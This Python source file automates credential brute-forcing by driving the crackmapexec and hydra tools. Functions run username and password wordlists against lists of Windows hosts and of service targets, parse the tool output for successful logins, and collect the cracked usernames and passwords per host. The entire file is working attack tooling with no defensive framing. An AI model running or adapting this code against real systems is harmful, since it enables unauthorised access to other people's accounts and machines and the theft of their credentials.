import subprocess as sp
import re


#crackmapexec

# assumes it receives a list of Windows hosts
# input list(str)
def crackmapexec_run(host, t=100):
	brute_result = sp.run(['crackmapexec', '-t', str(t), host, '-u', 'username.txt', '-p', 'password.txt'], universal_newlines=True, stdout=sp.PIPE)
	output = crackmapexec_examine(brute_result)
	if output:
		return output
	return None


def crackmapexec_examine(brute_result):
	for res in brute_result.stdout.splitlines():
		if '[+]' in res:
			namepass = res.split("\\", 1)[1]

			username = namepass.split(':')[0]
			if '(Pwn3d!)' in namepass:
				password = re.search(':(.*)\\(', namepass).group(1)
			else:
				password = namepass.split(":", 1)[1]
			return username, password, '[][windows]'
	return None


# input: list of valid hosts
# output: dict(hostname: (username, password, type/service))
def crackmapexec(hosts):
	out = {}
	for host in hosts:
		result = crackmapexec_run(host)
		if result:
			out[host] = result
	return out


# hydra

def hydra_chomp(scent_trail):
	# print('running command:', 'hydra', '-V', '-L', 'username.txt', '-P', 'password.txt', str(scent_trail[2])+"://"+str(scent_trail[0]))
	brute_result = sp.run(['hydra', '-V', '-L', 'username.txt', '-P', 'password.txt', str(scent_trail[2])+"://"+str(scent_trail[0]), '-s', str(scent_trail[1])], universal_newlines=True, stdout=sp.PIPE)
	output = hydra_swallow(brute_result)
	if output:
		return output
	return None


def hydra_swallow(bite):
	for res in bite.stdout.splitlines():
		if 'host:' in res:
			split_list = res.split()
			portservice = split_list[0]
			ip = split_list[2]
			username = split_list[4]
			password = split_list[6]
			return username, password, portservice
	return None


# input: list of valid targets
# output: dict(hostname: (username, password, type/service))
def hydra(target_scents):
	out = {}
	for target in target_scents:
		result = hydra_chomp(target)
		if result:
			out[target[0]] = result
	return out
